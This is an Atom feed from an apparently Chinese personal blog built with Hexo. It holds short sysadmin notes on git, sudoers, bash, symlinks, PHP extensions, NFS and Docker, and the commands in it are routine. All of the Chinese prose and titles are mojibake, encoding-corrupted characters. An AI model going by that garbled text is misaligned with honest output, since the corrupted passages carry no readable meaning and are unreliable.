<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[Live with love]]></title>
  <subtitle><![CDATA[Live with love]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://yoursite.com/"/>
  <updated>2016-06-26T13:04:36.000Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name><![CDATA[è·µè¡Œ]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[Gitå‘½ä»¤å­¦ä¹ ]]></title>
    <link href="http://yoursite.com/2016/06/26/Git%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2016/06/26/Gitå‘½ä»¤å­¦ä¹ /</id>
    <published>2016-06-26T04:11:58.000Z</published>
    <updated>2016-06-26T13:04:36.000Z</updated>
    <content type="html"><![CDATA[<h3 id="Git_u8FDC_u7A0B_u64CD_u4F5C_u8BE6_u89E3"><a href="#Git_u8FDC_u7A0B_u64CD_u4F5C_u8BE6_u89E3" class="headerlink" title="Gitè¿œç¨‹æ“ä½œè¯¦è§£"></a><a href="http://www.ruanyifeng.com/blog/2014/06/git_remote.html" target="_blank" rel="external">Gitè¿œç¨‹æ“ä½œè¯¦è§£</a></h3><p>æ¶‰åŠå‘½ä»¤:</p>
<ul>
<li>git clone</li>
<li>git remote</li>
<li>git fetch</li>
<li>git pull</li>
<li>git push</li>
</ul>
<h4 id="git_branch_u547D_u4EE4_u7684-r_u9009_u9879_uFF0C_u53EF_u4EE5_u7528_u6765_u67E5_u770B_u8FDC_u7A0B_u5206_u652F_uFF0C-a_u9009_u9879_u67E5_u770B_u6240_u6709_u5206_u652F_u3002"><a href="#git_branch_u547D_u4EE4_u7684-r_u9009_u9879_uFF0C_u53EF_u4EE5_u7528_u6765_u67E5_u770B_u8FDC_u7A0B_u5206_u652F_uFF0C-a_u9009_u9879_u67E5_u770B_u6240_u6709_u5206_u652F_u3002" class="headerlink" title="git branchå‘½ä»¤çš„-ré€‰é¡¹ï¼Œå¯ä»¥ç”¨æ¥æŸ¥çœ‹è¿œç¨‹åˆ†æ”¯ï¼Œ-aé€‰é¡¹æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯ã€‚"></a>git branchå‘½ä»¤çš„-ré€‰é¡¹ï¼Œå¯ä»¥ç”¨æ¥æŸ¥çœ‹è¿œç¨‹åˆ†æ”¯ï¼Œ-aé€‰é¡¹æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯ã€‚</h4><pre><code>$ git branch -r
origin/master

$ git branch -a
* master
  remotes/origin/master
</code></pre><h4 id="u53D6_u56DE_u8FDC_u7A0B_u4E3B_u673A_u7684_u66F4_u65B0_u4EE5_u540E_uFF0C_u53EF_u4EE5_u5728_u5B83_u7684_u57FA_u7840_u4E0A_uFF0C_u4F7F_u7528git_checkout_u547D_u4EE4_u521B_u5EFA_u4E00_u4E2A_u65B0_u7684_u5206_u652F_u3002"><a href="#u53D6_u56DE_u8FDC_u7A0B_u4E3B_u673A_u7684_u66F4_u65B0_u4EE5_u540E_uFF0C_u53EF_u4EE5_u5728_u5B83_u7684_u57FA_u7840_u4E0A_uFF0C_u4F7F_u7528git_checkout_u547D_u4EE4_u521B_u5EFA_u4E00_u4E2A_u65B0_u7684_u5206_u652F_u3002" class="headerlink" title="å–å›è¿œç¨‹ä¸»æœºçš„æ›´æ–°ä»¥åï¼Œå¯ä»¥åœ¨å®ƒçš„åŸºç¡€ä¸Šï¼Œä½¿ç”¨git checkoutå‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–°çš„åˆ†æ”¯ã€‚"></a>å–å›è¿œç¨‹ä¸»æœºçš„æ›´æ–°ä»¥åï¼Œå¯ä»¥åœ¨å®ƒçš„åŸºç¡€ä¸Šï¼Œä½¿ç”¨git checkoutå‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–°çš„åˆ†æ”¯ã€‚</h4><pre><code>$ git checkout -b newBrach origin/master
</code></pre><h4 id="u6B64_u5916_uFF0C_u4E5F_u53EF_u4EE5_u4F7F_u7528git_merge_u547D_u4EE4_u6216_u8005git_rebase_u547D_u4EE4_uFF0C_u5728_u672C_u5730_u5206_u652F_u4E0A_u5408_u5E76_u8FDC_u7A0B_u5206_u652F_u3002"><a href="#u6B64_u5916_uFF0C_u4E5F_u53EF_u4EE5_u4F7F_u7528git_merge_u547D_u4EE4_u6216_u8005git_rebase_u547D_u4EE4_uFF0C_u5728_u672C_u5730_u5206_u652F_u4E0A_u5408_u5E76_u8FDC_u7A0B_u5206_u652F_u3002" class="headerlink" title="æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨git mergeå‘½ä»¤æˆ–è€…git rebaseå‘½ä»¤ï¼Œåœ¨æœ¬åœ°åˆ†æ”¯ä¸Šåˆå¹¶è¿œç¨‹åˆ†æ”¯ã€‚"></a>æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨git mergeå‘½ä»¤æˆ–è€…git rebaseå‘½ä»¤ï¼Œåœ¨æœ¬åœ°åˆ†æ”¯ä¸Šåˆå¹¶è¿œç¨‹åˆ†æ”¯ã€‚</h4><pre><code>$ git merge origin/master
# æˆ–è€…
$ git rebase origin/master
</code></pre><p>ä¸Šé¢å‘½ä»¤è¡¨ç¤ºåœ¨å½“å‰åˆ†æ”¯ä¸Šï¼Œåˆå¹¶origin/masterã€‚</p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="Git_u8FDC_u7A0B_u64CD_u4F5C_u8BE6_u89E3"><a href="#Git_u8FDC_u7A0B_u64CD_u4F5C_u8BE6_u89E3" class="headerlink" title="Gitè¿œç¨‹æ“ä½œè¯¦è§£"></a]]>
    </summary>
    
      <category term="Git" scheme="http://yoursite.com/tags/Git/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Gitä»£ç å†²çªå¸¸è§è§£å†³æ–¹æ³•]]></title>
    <link href="http://yoursite.com/2016/06/25/Git%E4%BB%A3%E7%A0%81%E5%86%B2%E7%AA%81%E5%B8%B8%E8%A7%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    <id>http://yoursite.com/2016/06/25/Gitä»£ç å†²çªå¸¸è§è§£å†³æ–¹æ³•/</id>
    <published>2016-06-25T04:08:13.000Z</published>
    <updated>2016-06-26T13:04:25.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u5982_u679C_u540C_u4E00_u4E2A_u6587_u4EF6_2C__u8FDC_u7AEF_u505A_u4E86_u4FEE_u6539_2C__u672C_u5730_u4E5F_u505A_u4E86_u4FEE_u6539_2C__u8FD9_u65F6_u5019_u672C_u5730_u6267_u884C_git_pull__2C__u4F1A_u62A5_u9519_3A"><a href="#u5982_u679C_u540C_u4E00_u4E2A_u6587_u4EF6_2C__u8FDC_u7AEF_u505A_u4E86_u4FEE_u6539_2C__u672C_u5730_u4E5F_u505A_u4E86_u4FEE_u6539_2C__u8FD9_u65F6_u5019_u672C_u5730_u6267_u884C_git_pull__2C__u4F1A_u62A5_u9519_3A" class="headerlink" title="å¦‚æœåŒä¸€ä¸ªæ–‡ä»¶, è¿œç«¯åšäº†ä¿®æ”¹, æœ¬åœ°ä¹Ÿåšäº†ä¿®æ”¹, è¿™æ—¶å€™æœ¬åœ°æ‰§è¡Œ git pull  , ä¼šæŠ¥é”™:"></a>å¦‚æœåŒä¸€ä¸ªæ–‡ä»¶, è¿œç«¯åšäº†ä¿®æ”¹, æœ¬åœ°ä¹Ÿåšäº†ä¿®æ”¹, è¿™æ—¶å€™æœ¬åœ°æ‰§è¡Œ git pull  , ä¼šæŠ¥é”™:</h3><pre><code>Updating c1cddf2..78c0dc1
error: Your local changes to the following files would be overwritten by merge:
    conf/gitolite.conf
Please, commit your changes or stash them before you can merge.
Aborting
</code></pre><p>å› ä¸ºç›´æ¥æ‹‰å–è¿œç«¯çš„, ä¼šè¦†ç›–æœ¬åœ°çš„ä¿®æ”¹, æ‰€ä»¥ä¼šæŠ¥è¿™ä¸ªé”™.</p>
<p>å¦‚æœå¸Œæœ›ä¿ç•™ç”Ÿäº§æœåŠ¡å™¨ä¸Šæ‰€åšçš„æ”¹åŠ¨,ä»…ä»…å¹¶å…¥æ–°é…ç½®é¡¹, å¤„ç†æ–¹æ³•å¦‚ä¸‹:</p>
<pre><code>git stash  #æŠŠæœ¬åœ°ä¿®æ”¹æš‚å­˜
git pull    #æ‹‰å–è¿œç«¯å˜æ›´
git stash pop    # å°†æœ¬åœ°å˜æ›´åŠ å…¥
</code></pre><p>ç„¶åå¯ä»¥ä½¿ç”¨git diff -w +æ–‡ä»¶å æ¥ç¡®è®¤ä»£ç è‡ªåŠ¨åˆå¹¶çš„æƒ…å†µ.</p>
<p>åè¿‡æ¥,å¦‚æœå¸Œæœ›ç”¨ä»£ç åº“ä¸­çš„æ–‡ä»¶å®Œå…¨è¦†ç›–æœ¬åœ°å·¥ä½œç‰ˆæœ¬. æ–¹æ³•å¦‚ä¸‹:</p>
<pre><code>git reset --hard
git pull
</code></pre><p>å…¶ä¸­git resetæ˜¯é’ˆå¯¹ç‰ˆæœ¬,å¦‚æœæƒ³é’ˆå¯¹æ–‡ä»¶å›é€€æœ¬åœ°ä¿®æ”¹,ä½¿ç”¨</p>
<pre><code>git checkout HEAD file/to/restore  
</code></pre><p>å‚è€ƒ:</p>
<p><a href="http://blog.csdn.net/iefreer/article/details/7679631" target="_blank" rel="external">http://blog.csdn.net/iefreer/article/details/7679631</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u5982_u679C_u540C_u4E00_u4E2A_u6587_u4EF6_2C__u8FDC_u7AEF_u505A_u4E86_u4FEE_u6539_2C__u672C_u5730_u4E5F_u505A_u4E86_u4FEE_u6539_2C__]]>
    </summary>
    
      <category term="Git" scheme="http://yoursite.com/tags/Git/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[è®¾ç½®æ™®é€šç”¨æˆ·sudo å…å¯†ç æ‰§è¡Œç‰¹å®šå‘½ä»¤]]></title>
    <link href="http://yoursite.com/2016/06/21/%E8%AE%BE%E7%BD%AE%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7sudo-%E5%85%8D%E5%AF%86%E7%A0%81%E6%89%A7%E8%A1%8C%E7%89%B9%E5%AE%9A%E5%91%BD%E4%BB%A4/"/>
    <id>http://yoursite.com/2016/06/21/è®¾ç½®æ™®é€šç”¨æˆ·sudo-å…å¯†ç æ‰§è¡Œç‰¹å®šå‘½ä»¤/</id>
    <published>2016-06-21T07:52:03.000Z</published>
    <updated>2016-06-21T07:55:25.000Z</updated>
    <content type="html"><![CDATA[<p>visudo</p>
<pre><code>joe ALL=(ALL) NOPASSWD: /full/path/to/command
</code></pre><p>å‚è€ƒ:</p>
<p><a href="http://www.atrixnet.com/allow-an-unprivileged-user-to-run-a-certain-command-with-sudo/" target="_blank" rel="external">Allow An Unprivileged User To Run A Certain Command With Sudo</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>visudo</p>
<pre><code>joe ALL=(ALL) NOPASSWD: /full/path/to/command
</code></pre><p>å‚è€ƒ:</p>
<p><a href="http://www.atrixnet.com/allow-an-]]>
    </summary>
    
      <category term="sudo" scheme="http://yoursite.com/tags/sudo/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[bash shellè„šæœ¬çŠ¯é”™é›†é”¦]]></title>
    <link href="http://yoursite.com/2016/06/12/bash-shell%E8%84%9A%E6%9C%AC%E7%8A%AF%E9%94%99%E9%9B%86%E9%94%A6/"/>
    <id>http://yoursite.com/2016/06/12/bash-shellè„šæœ¬çŠ¯é”™é›†é”¦/</id>
    <published>2016-06-12T08:48:27.000Z</published>
    <updated>2016-06-12T08:57:18.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u4E0B_u5212_u7EBF_u8FDE_u63A5_u53D8_u91CF"><a href="#u4E0B_u5212_u7EBF_u8FDE_u63A5_u53D8_u91CF" class="headerlink" title="ä¸‹åˆ’çº¿è¿æ¥å˜é‡"></a>ä¸‹åˆ’çº¿è¿æ¥å˜é‡</h3><p>æœ‰ä¸ªæ•°æ®åº“å¤‡ä»½è„šæœ¬</p>
<pre><code>DB=dbname

mysqldump -uroot -p $DB &gt; $DB_`date +%F`.sql
</code></pre><p>ç„¶åå‘ç°å¤‡ä»½å‡ºæ¥çš„æ–‡ä»¶ååªæœ‰æ—¶é—´, åæ¥æ‰çŸ¥é“shell æ˜¯æŠŠ <code>$DB_</code> å½“æˆä¸€ä¸ªå˜é‡äº†, ç„¶åå‰é¢ <code>$DB_</code> åˆæ²¡èµ‹å€¼, æ‰€ä»¥å°±æ˜¯ç©º. æ­£ç¡®çš„å†™æ³•åº”è¯¥æ˜¯: </p>
<pre><code>mysqldump -uroot -p $DB &gt; ${DB}_`date +%F`.sql
</code></pre><p>è§„èŒƒå¾ˆé‡è¦, ä»¥åä¸è¦å·æ‡’</p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u4E0B_u5212_u7EBF_u8FDE_u63A5_u53D8_u91CF"><a href="#u4E0B_u5212_u7EBF_u8FDE_u63A5_u53D8_u91CF" class="headerlink" title="ä¸‹åˆ’çº¿è¿æ¥å˜é‡"><]]>
    </summary>
    
      <category term="error" scheme="http://yoursite.com/tags/error/"/>
    
      <category term="shell" scheme="http://yoursite.com/tags/shell/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Linux å‘½ä»¤]]></title>
    <link href="http://yoursite.com/2016/05/19/Linux-%E5%91%BD%E4%BB%A4/"/>
    <id>http://yoursite.com/2016/05/19/Linux-å‘½ä»¤/</id>
    <published>2016-05-19T09:09:36.000Z</published>
    <updated>2016-05-25T01:12:38.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u8F6F_u8FDE_u63A5"><a href="#u8F6F_u8FDE_u63A5" class="headerlink" title="è½¯è¿æ¥"></a>è½¯è¿æ¥</h3><h4 id="u521B_u5EFA"><a href="#u521B_u5EFA" class="headerlink" title="åˆ›å»º"></a>åˆ›å»º</h4><p>æƒ³æŠŠç›®å½• /opt/www/v1.0.1 è½¯è¿æ¥åˆ° /mnt/ä¸‹é¢, è½¯é“¾æ¥å, ç›®å½•ä¸º /mnt/v1.0.1</p>
<p>å‘½ä»¤: </p>
<pre><code>ln -s /opt/www/v1.0.1/ /mnt/
</code></pre><p>è¿™æ ·ä¼šäº§ç”Ÿä¸€ä¸ª <code>/mnt/v1.0.1 -&gt; /opt/www/v1.0.1/</code> çš„è½¯è¿æ¥</p>
<p>åˆæ¯”å¦‚è¦åˆ›å»ºä¸€ä¸ªç‰¹å®šåç§°çš„è½¯è¿æ¥ç›®å½•, æ¯”å¦‚ beta:</p>
<pre><code>ln -s /opt/www/branches/v1.1 /opt/www/beta
</code></pre><p>æœ€åæ˜¯è¿™æ ·çš„: <code>/opt/www/beta -&gt; /opt/www/branches/v1.1/</code></p>
<p>æ³¨æ„</p>
<ul>
<li>è¦ç”¨ç»å¯¹è·¯å¾„, ç”¨ç›¸å¯¹è·¯å¾„ä¼šæŠ¥é”™: Too many levels of symbolic links</li>
<li>ç›®å½•åé¢çš„æ–œæ  / è¦å¸¦ä¸Š</li>
</ul>
<h4 id="u5220_u9664"><a href="#u5220_u9664" class="headerlink" title="åˆ é™¤"></a>åˆ é™¤</h4><pre><code>rm -rf /mnt/v1.0.1
</code></pre><p>æ³¨æ„: ä¸æ˜¯ <code>rm -rf /mnt/v1.0.1/</code>  è¿™æ ·ä¼šæŠŠçœŸæ­£å†…å®¹åˆ é™¤çš„!</p>
<a id="more"></a>]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u8F6F_u8FDE_u63A5"><a href="#u8F6F_u8FDE_u63A5" class="headerlink" title="è½¯è¿æ¥"></a>è½¯è¿æ¥</h3><h4 id="u521B_u5EFA"><a href="#u521B_u5EFA" class="headerlink" title="åˆ›å»º"></a>åˆ›å»º</h4><p>æƒ³æŠŠç›®å½• /opt/www/v1.0.1 è½¯è¿æ¥åˆ° /mnt/ä¸‹é¢, è½¯é“¾æ¥å, ç›®å½•ä¸º /mnt/v1.0.1</p>
<p>å‘½ä»¤: </p>
<pre><code>ln -s /opt/www/v1.0.1/ /mnt/
</code></pre><p>è¿™æ ·ä¼šäº§ç”Ÿä¸€ä¸ª <code>/mnt/v1.0.1 -&gt; /opt/www/v1.0.1/</code> çš„è½¯è¿æ¥</p>
<p>åˆæ¯”å¦‚è¦åˆ›å»ºä¸€ä¸ªç‰¹å®šåç§°çš„è½¯è¿æ¥ç›®å½•, æ¯”å¦‚ beta:</p>
<pre><code>ln -s /opt/www/branches/v1.1 /opt/www/beta
</code></pre><p>æœ€åæ˜¯è¿™æ ·çš„: <code>/opt/www/beta -&gt; /opt/www/branches/v1.1/</code></p>
<p>æ³¨æ„</p>
<ul>
<li>è¦ç”¨ç»å¯¹è·¯å¾„, ç”¨ç›¸å¯¹è·¯å¾„ä¼šæŠ¥é”™: Too many levels of symbolic links</li>
<li>ç›®å½•åé¢çš„æ–œæ  / è¦å¸¦ä¸Š</li>
</ul>
<h4 id="u5220_u9664"><a href="#u5220_u9664" class="headerlink" title="åˆ é™¤"></a>åˆ é™¤</h4><pre><code>rm -rf /mnt/v1.0.1
</code></pre><p>æ³¨æ„: ä¸æ˜¯ <code>rm -rf /mnt/v1.0.1/</code>  è¿™æ ·ä¼šæŠŠçœŸæ­£å†…å®¹åˆ é™¤çš„!</p>]]>
    
    </summary>
    
      <category term="man" scheme="http://yoursite.com/tags/man/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[php æ·»åŠ pcntlå’Œ redis æ”¯æŒ]]></title>
    <link href="http://yoursite.com/2016/05/16/php-%E6%B7%BB%E5%8A%A0pcntl%E5%92%8C-redis-%E6%94%AF%E6%8C%81/"/>
    <id>http://yoursite.com/2016/05/16/php-æ·»åŠ pcntlå’Œ-redis-æ”¯æŒ/</id>
    <published>2016-05-16T02:17:33.000Z</published>
    <updated>2016-05-16T03:47:59.000Z</updated>
    <content type="html"><![CDATA[<h3 id="pcntl"><a href="#pcntl" class="headerlink" title="pcntl"></a>pcntl</h3><p>è¿›å…¥åŒç‰ˆæœ¬ php æºç :</p>
<pre><code>cd ext/pcntl
/usr/local/php/bin/phpize
./configure --with-php-config=/usr/local/php/bin/php-config
make &amp;&amp; make install
</code></pre><p>æµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸ</p>
<pre><code>&lt;?php
echo pcntl_fork();
?&gt;
</code></pre><p>è¾“å‡º</p>
<pre><code>23165
</code></pre><h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><pre><code>git clone https://github.com/phpredis/phpredis.git phpredis
cd phpredis
/usr/local/php/bin/phpize
./configure --with-php-config=/usr/local/php/bin/php-config
make &amp;&amp; make install
</code></pre><p>æœ€åè®°å¾—æŠŠæ‰©å±•åŠ å…¥ php.ini , é‡æ–°åŠ è½½é…ç½®ç”Ÿæ•ˆ</p>
<a id="more"></a>
<p>å‚è€ƒ:</p>
<p><a href="http://www.cnblogs.com/fengwei/archive/2012/09/16/2687716.html" target="_blank" rel="external">phpæ·»åŠ pcntlæ‰©å±• é—®é¢˜åŠè§£å†³æ–¹æ³•</a></p>
<p><a href="https://blog.phpgao.com/redis_php.html#å¼€å¯redisæ‰©å±•" target="_blank" rel="external">LinuxæœåŠ¡å™¨é…ç½®Rediså¹¶å¯ç”¨PHPæ”¯æŒ</a></p>
<p><a href="http://my.oschina.net/liuhuan0927/blog/616880" target="_blank" rel="external">PHP æ”¯æŒ redisæ‰©å±•</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="pcntl"><a href="#pcntl" class="headerlink" title="pcntl"></a>pcntl</h3><p>è¿›å…¥åŒç‰ˆæœ¬ php æºç :</p>
<pre><code>cd ext/pcntl
/usr/local/php/bin/phpize
./configure --with-php-config=/usr/local/php/bin/php-config
make &amp;&amp; make install
</code></pre><p>æµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸ</p>
<pre><code>&lt;?php
echo pcntl_fork();
?&gt;
</code></pre><p>è¾“å‡º</p>
<pre><code>23165
</code></pre><h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><pre><code>git clone https://github.com/phpredis/phpredis.git phpredis
cd phpredis
/usr/local/php/bin/phpize
./configure --with-php-config=/usr/local/php/bin/php-config
make &amp;&amp; make install
</code></pre><p>æœ€åè®°å¾—æŠŠæ‰©å±•åŠ å…¥ php.ini , é‡æ–°åŠ è½½é…ç½®ç”Ÿæ•ˆ</p>]]>
    
    </summary>
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
      <category term="redis" scheme="http://yoursite.com/tags/redis/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Centos7 é…ç½® NFS]]></title>
    <link href="http://yoursite.com/2016/05/12/Centos7-%E9%85%8D%E7%BD%AE-NFS/"/>
    <id>http://yoursite.com/2016/05/12/Centos7-é…ç½®-NFS/</id>
    <published>2016-05-12T08:35:09.000Z</published>
    <updated>2016-05-25T01:12:41.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u5B89_u88C5"><a href="#u5B89_u88C5" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><pre><code>yum -y install nfs-utils
</code></pre><h3 id="u914D_u7F6E"><a href="#u914D_u7F6E" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p>nfsé…ç½®æ–‡ä»¶:</p>
<pre><code>cat /etc/exports
/data/backup/bid 10.45.46.144/24(rw,no_root_squash)    #å…è®¸æŒ‚è½½ NFS çš„æœºå™¨ip
</code></pre><p>æœåŠ¡è‡ªå¯åŠ¨:</p>
<pre><code>systemctl start rpcbind nfs-server 
systemctl enable rpcbind nfs-server
</code></pre><p>nfs å¯åŠ¨å, æ£€æŸ¥çŠ¶æ€:</p>
<pre><code>exportfs -v
/data/backup/bid
10.45.46.144/24(rw,wdelay,no_root_squash,no_subtree_check,sec=sys,rw,secure,no_root_squash,no_all_squash)
</code></pre><p>é‡æ–°è¯»å– nfs é…ç½®æ–‡ä»¶:</p>
<pre><code>exportfs -rv
</code></pre><a id="more"></a>
<h3 id="u5BA2_u6237_u7AEF_u6302_u8F7D"><a href="#u5BA2_u6237_u7AEF_u6302_u8F7D" class="headerlink" title="å®¢æˆ·ç«¯æŒ‚è½½"></a>å®¢æˆ·ç«¯æŒ‚è½½</h3><pre><code>mount -t nfs nfs_server_ip:/data/backup/bid /mnt/
</code></pre><p>æŸ¥çœ‹æŒ‚è½½</p>
<pre><code>df -Th
</code></pre><p>å‚è€ƒ:</p>
<p>é˜²ç«å¢™å¼€æ”¾ç«¯å£111å’Œ2049</p>
<p><a href="http://blog.dreamlu.net/blog/67" target="_blank" rel="external">http://blog.dreamlu.net/blog/67</a></p>
<p><a href="http://www.server-world.info/en/note?os=CentOS_7&amp;p=nfs" target="_blank" rel="external">http://www.server-world.info/en/note?os=CentOS_7&amp;p=nfs</a></p>
<p><a href="http://www.server-world.info/en/note?os=CentOS_7&amp;p=nfs&amp;f=2" target="_blank" rel="external">http://www.server-world.info/en/note?os=CentOS_7&amp;p=nfs&amp;f=2</a></p>
<p>æŒ‚è½½å‘½ä»¤</p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u5B89_u88C5"><a href="#u5B89_u88C5" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><pre><code>yum -y install nfs-utils
</code></pre><h3 id="u914D_u7F6E"><a href="#u914D_u7F6E" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p>nfsé…ç½®æ–‡ä»¶:</p>
<pre><code>cat /etc/exports
/data/backup/bid 10.45.46.144/24(rw,no_root_squash)    #å…è®¸æŒ‚è½½ NFS çš„æœºå™¨ip
</code></pre><p>æœåŠ¡è‡ªå¯åŠ¨:</p>
<pre><code>systemctl start rpcbind nfs-server 
systemctl enable rpcbind nfs-server
</code></pre><p>nfs å¯åŠ¨å, æ£€æŸ¥çŠ¶æ€:</p>
<pre><code>exportfs -v
/data/backup/bid
10.45.46.144/24(rw,wdelay,no_root_squash,no_subtree_check,sec=sys,rw,secure,no_root_squash,no_all_squash)
</code></pre><p>é‡æ–°è¯»å– nfs é…ç½®æ–‡ä»¶:</p>
<pre><code>exportfs -rv
</code></pre>]]>
    
    </summary>
    
      <category term="nfs" scheme="http://yoursite.com/tags/nfs/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[<<Dockerä»å…¥é—¨åˆ°å®è·µ>>è¯»ä¹¦ç¬”è®°(ä¸€) åŸºç¡€ç¯‡]]></title>
    <link href="http://yoursite.com/2016/05/11/Docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E8%B7%B5-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2016/05/11/Dockerä»å…¥é—¨åˆ°å®è·µ-è¯»ä¹¦ç¬”è®°/</id>
    <published>2016-05-11T07:41:10.000Z</published>
    <updated>2016-05-11T07:41:10.000Z</updated>
    <content type="html"><![CDATA[<hr>
<p>ç¯å¢ƒ:</p>
<ul>
<li>Mac OS X 10.11</li>
<li>Ubuntu 14.04</li>
<li>Docker Toolså®‰è£…</li>
</ul>
<p>è®°å½•ä¸€ä¸‹ docker çš„å­¦ä¹ å†ç¨‹, ä¸‰å¤§åŸºç¡€æ¦‚å¿µå·²ç»åŸºæœ¬äº†è§£, ç„¶åä¸‹ä¸€æ­¥æœ‰ç‚¹è¿·èŒ«, è™½ç„¶è¿·èŒ«, ä½†æ˜¯ä¸èƒ½æ­¢æ­¥ä¸å‰, äºæ˜¯æˆ‘å†³å®šå…ˆç”¨æœ€ç¬¨çš„æ–¹æ³•, æŒ‰ä¹¦ä¸Šè¯´çš„åšä¸€éå§â€¦, è™½ç„¶çœ‹èµ·æ¥éƒ½æ‡‚, ä½†æ˜¯ä¸åšæ„Ÿè§‰ä¸è¸å®å•Š - -<br><a id="more"></a></p>
<h4 id="u521B_u5EFA_u955C_u50CF"><a href="#u521B_u5EFA_u955C_u50CF" class="headerlink" title="åˆ›å»ºé•œåƒ"></a>åˆ›å»ºé•œåƒ</h4><p>1 æ‹‰å–ç°æœ‰é•œåƒ, ä¿®æ”¹å commit</p>
<p>2 Dockerfileåˆ›å»º</p>
<p>3 å¯¼å…¥é•œåƒåˆ›å»º</p>
<p>OpenVZå®¹å™¨æ˜¯ä¸€ä¸ªè½»é‡è™šæ‹Ÿæœºï¼Œä¸€ä¸ªå®Œæ•´çš„æ“ä½œç³»ç»Ÿç¯å¢ƒï¼Œå®ƒçš„ä¸»è¦ç”¨é€”æ˜¯å……å½“è™šæ‹Ÿç§æœ‰æœåŠ¡å™¨ã€‚è€ŒDockerçš„å“²å­¦æ˜¯<em>æ¯ä¸ªå®¹å™¨è¿è¡Œä¸€ä¸ªåº”ç”¨è¿›ç¨‹</em></p>
<p><a href="http://chuansong.me/n/1119422" target="_blank" rel="external">openvz vs docker</a></p>
<h4 id="u5220_u9664_u955C_u50CF"><a href="#u5220_u9664_u955C_u50CF" class="headerlink" title="åˆ é™¤é•œåƒ"></a>åˆ é™¤é•œåƒ</h4><p>*æ³¨æ„ï¼šåœ¨åˆ é™¤é•œåƒä¹‹å‰è¦å…ˆç”¨ docker rm åˆ æ‰ä¾èµ–äºè¿™ä¸ªé•œåƒçš„æ‰€æœ‰å®¹å™¨ã€‚</p>
<h4 id="u8FDB_u5165_u5BB9_u5668"><a href="#u8FDB_u5165_u5BB9_u5668" class="headerlink" title="è¿›å…¥å®¹å™¨"></a>è¿›å…¥å®¹å™¨</h4><p>attach(ä¸æ¨è)</p>
<p>docker exec æ˜¯Dockerå…§å»ºçš„å‘½ä»¤ã€‚ä¸‹é¢ç¤ºç¯„å¦‚ä½•ä½¿ç”¨è©²å‘½ä»¤</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">$ sudo docker run -idt ubuntu</span><br><span class="line"><span class="number">243</span>c32535da7d142fb0e6df616a3c3ada0b8ab417937c853a9e1c251f499f550</span><br><span class="line">$ sudo docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line"><span class="number">243</span>c32535da7        ubuntu:latest       <span class="string">"/bin/bash"</span>         <span class="number">18</span> seconds ago      Up <span class="number">17</span> seconds                           nostalgic_hypatia</span><br><span class="line">$sudo docker exec -ti nostalgic_hypatia bash</span><br><span class="line">root@<span class="number">243</span>c32535da7:/<span class="preprocessor">#</span></span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/jpetazzo/nsenter" target="_blank" rel="external">nsenter</a>  è¿™ä¸ªå®‰è£…èµ·æ¥å¾ˆè›‹ç–¼å•Š, æœ‰äº†docker exec , å°±ä¸æŠ˜è…¾ nsenter äº†, è€Œä¸”å‘½ä»¤åˆè‡­åˆé•¿</p>
<h4 id="u5BB9_u5668_u7684_u5BFC_u51FA_u5BFC_u5165"><a href="#u5BB9_u5668_u7684_u5BFC_u51FA_u5BFC_u5165" class="headerlink" title="å®¹å™¨çš„å¯¼å‡ºå¯¼å…¥"></a>å®¹å™¨çš„å¯¼å‡ºå¯¼å…¥</h4><p>å¯¼å‡º</p>
